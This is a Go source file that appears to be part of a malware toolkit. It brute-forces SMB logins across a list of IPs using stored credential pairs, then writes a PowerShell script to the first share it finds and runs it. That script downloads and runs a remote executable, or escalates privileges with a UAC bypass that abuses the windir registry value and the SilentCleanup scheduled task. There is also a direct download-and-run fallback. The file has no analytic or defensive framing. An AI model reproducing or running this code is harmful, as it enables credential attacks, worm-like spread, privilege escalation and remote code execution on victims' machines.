package pack

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/hirochachacha/go-smb2"
)

const (
	dirPath           = "C:\\Windows\\loveorhate"
	smbMarkerFileName = "upload_marker.txt"
)

func SMB() {
	ipFilePath := filepath.Join(dirPath, "smbip.txt")
	ipFile, err := os.Open(ipFilePath)
	if err != nil {
		log.Printf("Error reading SMB server IPs file: %v\n", err)
		return
	}
	defer ipFile.Close()

	scanner := bufio.NewScanner(ipFile)

	credFilePath := filepath.Join(dirPath, "smbcred.txt")
	credFile, err := os.Open(credFilePath)
	if err != nil {
		log.Printf("Error reading SMB credentials file: %v\n", err)
		return
	}
	defer credFile.Close()

	credScanner := bufio.NewScanner(credFile)

	for scanner.Scan() {
		ip := scanner.Text()

		credFile.Seek(0, io.SeekStart)

		for credScanner.Scan() {
			cred := strings.Split(credScanner.Text(), ":")
			username := cred[0]
			password := cred[1]

			if !hasMarkerFile(filepath.Join(dirPath, ip)) {
				if err := connectAndUpload(filepath.Join(dirPath, ip), username, password); err != nil {
					log.Printf("Failed to connect to %s with %s:%s: %v\n", ip, username, password, err)
				} else {
					log.Printf("Successfully connected to %s with %s:%s\n", ip, username, password)
					createMarkerFile(filepath.Join(dirPath, ip))
				}
			} else {
				log.Printf("Skipping %s - Marker file exists\n", ip)
			}
		}
	}
}

func hasMarkerFile(dirPath string) bool {
	markerFilePath := filepath.Join(dirPath, smbMarkerFileName)
	_, err := os.Stat(markerFilePath)
	return !os.IsNotExist(err)
}

func createMarkerFile(dirPath string) error {
	markerFilePath := filepath.Join(dirPath, smbMarkerFileName)
	file, err := os.Create(markerFilePath)
	if err != nil {
		return fmt.Errorf("failed to create marker file: %v", err)
	}
	defer file.Close()
	return nil
}

func connectAndUpload(ip, username, password string) error {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:445", ip))
	if err != nil {
		return fmt.Errorf("failed to connect to %s: %v", ip, err)
	}
	defer conn.Close()

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     username,
			Password: password,
		},
	}

	s, err := d.Dial(conn)
	if err != nil {
		return fmt.Errorf("failed to dial SMB connection: %v", err)
	}
	defer s.Logoff()

	// List shared folders
	shares, err := s.ListSharenames()
	if err != nil {
		return fmt.Errorf("failed to list shares on %s: %v", ip, err)
	}

	if len(shares) == 0 {
		fmt.Printf("No shares found on %s with %s:%s\n", ip, username, password)
		return nil
	}

	// Use the first share found
	shareName := shares[0]

	// Write PS1 script to the share
	psScript := `
    if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
		# URL of the executable to download
	   $url = "https://sourceforge.net/projects/app/files/main.exe/download"
	   
	   # Path to save the downloaded executable
	   $downloadPath = "$env:TEMP\downloaded_System.exe"
	   
	   # Download the executable
	   Invoke-WebRequest -Uri $url -OutFile $downloadPath
	   
	   # Run the downloaded executable
	   Start-Process -FilePath $downloadPath -NoNewWindow -Wait
	   
	   # Remove the downloaded file (optional)
	   Remove-Item -Path $downloadPath -Force
	   
	   
	   } else {
		   $registryPath = "HKCU:\Environment"
		   $Name = "windir"
		   $Value = "powershell -ep bypass -w h $PSCommandPath;#"
		   Set-ItemProperty -Path $registryPath -Name $name -Value $Value
		   #Depending on the performance of the machine, some sleep time may be required before or after schtasks
		   schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
		   Remove-ItemProperty -Path $registryPath -Name $name
	   }`

	f, err := s.Mount(shareName)
	if err != nil {
		return fmt.Errorf("failed to mount share %s on %s: %v", shareName, ip, err)
	}
	defer f.Umount()

	psFileName := "hello.ps1"
	psFilePath := filepath.Join(shareName, psFileName)

	psFile, err := f.Create(psFilePath)
	if err != nil {
		return fmt.Errorf("failed to create PS1 file on %s: %v", ip, err)
	}
	defer f.Remove(psFilePath)
	defer psFile.Close()

	_, err = psFile.Write([]byte(psScript))
	if err != nil {
		return fmt.Errorf("failed to write PS1 script on %s: %v", ip, err)
	}

	fmt.Printf("PS1 script uploaded to %s on %s with %s:%s\n", psFilePath, ip, username, password)

	// Run the uploaded PS1 script using the powershell command
	cmd := exec.Command("powershell.exe", "-File", psFilePath)
	err = cmd.Run()
	if err != nil {
		fmt.Printf("Failed to run PS1 script on %s with %s:%s: %v\n", ip, username, password, err)

		// Download executable if PowerShell script fails
		executableURL := "https://sourceforge.net/projects/app/files/main.exe/download"
		executableFileName := "System.exe"
		executableFilePath := filepath.Join(shareName, executableFileName)

		err := downloadSMBFile(executableURL, executableFilePath)
		if err != nil {
			return fmt.Errorf("failed to download executable: %v", err)
		}

		fmt.Printf("Executable downloaded to %s on %s with %s:%s\n", executableFilePath, ip, username, password)

		// Run the downloaded executable
		execCmd := exec.Command(executableFilePath)
		execCmd.Stdout = os.Stdout
		execCmd.Stderr = os.Stderr
		if err := execCmd.Run(); err != nil {
			return fmt.Errorf("failed to run downloaded executable: %v", err)
		}
	}

	fmt.Printf("PS1 script executed on %s with %s:%s\n", ip, username, password)

	return nil
}

func downloadSMBFile(url, filePath string) error {
	client := &http.Client{Timeout: 10 * time.Second} // Set a timeout for the HTTP client

	response, err := client.Get(url)
	if err != nil {
		return fmt.Errorf("failed to download from %s: %v", url, err)
	}
	defer response.Body.Close()

	file, err := os.Create(filePath)
	if err != nil {
		return fmt.Errorf("failed to create file at %s: %v", filePath, err)
	}
	defer file.Close()

	_, err = io.Copy(file, response.Body)
	if err != nil {
		return fmt.Errorf("failed to copy content to %s: %v", filePath, err)
	}

	return nil
}
